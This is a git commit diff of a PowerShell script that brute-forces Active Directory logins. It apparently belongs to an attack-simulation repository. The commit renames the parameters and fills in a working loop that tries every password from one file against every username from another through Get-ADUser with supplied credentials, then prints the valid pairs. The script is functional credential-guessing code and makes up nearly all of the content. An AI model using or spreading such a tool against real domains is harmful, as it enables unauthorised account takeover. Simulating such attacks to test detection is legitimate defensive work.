45b15101b5d069113c8853c7bdcbb3167a33b57f
mthcht <75267080+mthcht@users.noreply.github.com>
2022-12-08 09:11:32 +0100

    Update Bruteforce.ps1

--- Simulation/Windows/ActiveDirectory/Bruteforce.ps1
+++ Simulation/Windows/ActiveDirectory/Bruteforce.ps1
@@ -2,21 +2,16 @@
 <#
 .Synopsis
     This script attempts to find valid credentials for a set of users by trying different passwords
-
 .DESCRIPTION
     This script takes two files as input, one with usernames and one with passwords. It then attempts 
     to authenticate each of the users with each of the passwords, and prints out any valid credentials
     that it finds.
-
 .EXAMPLE
-    .\Bruteforce.ps1 -passwordsFile .\passwords.txt -usersFile .\users.txt -waitTime 1
-
+    .\Bruteforce.ps1 -passfile .\passwords.txt -userfile .\users.txt -waitTime 1
 .PARAMETER passwordsFile
     Path to the file containing the passwords
-
 .PARAMETER usersFile
     Path to the file containing the usernames
-
 .PARAMETER waitTime
     The amount of time (in seconds) to wait after each authentication attempt
 #>
@@ -25,10 +20,10 @@
 [CmdletBinding()]
 param(
     [Parameter(Mandatory=$true)]
-    [string]$passwordsFile,
+    [string]$passfile,
 
     [Parameter(Mandatory=$true)]
-    [string]$usersFile,
+    [string]$userfile,
 
     [Parameter(Mandatory=$false)]
     [int]$waitTime = 0
@@ -41,8 +36,8 @@ Import-Module .\Microsoft.ActiveDirectory.Management.dll
 
 # Try to open the files and check for errors
 try {
-    $passwords = Get-Content $passwordsFile
-    $users = Get-Content $usersFile
+    $passwords = Get-Content $passfile
+    $users = Get-Content $userfile
 } catch {
     Write-Error "Error opening files. Please check if the paths are correct!"
 }
@@ -51,10 +46,18 @@ try {
 if ($passwords -and $users) {
     foreach ($user in $users) {
         foreach ($password in $passwords) {
-            # Try to authenticate the user with the current password
-            $result = Get-ADUser  -Identity $user FIXME
-            if ($result.AuthenticationResult -eq "AuthenticationSuccess") {
-                Write-Host "Found valid credentials for user $user : $password"
+        # Try to authenticate the user with the current password
+            Write-Host "Trying $password with $user"
+            $result = $null
+            try{
+                $result = Get-ADUser -Identity $user -Credential (New-Object System.Management.Automation.PSCredential -ArgumentList $user, (ConvertTo-SecureString -String "$password" -AsPlainText -Force)) -ErrorAction SilentlyContinue
+                Write-Host $result
+                if ($result) {
+                    Write-Host "Found valid credentials for user $user : $password"
+                }
+            }
+            catch{
+                  Write-Host "An error was encountered: $_"
             }
             Start-Sleep -Seconds $waitTime
         }
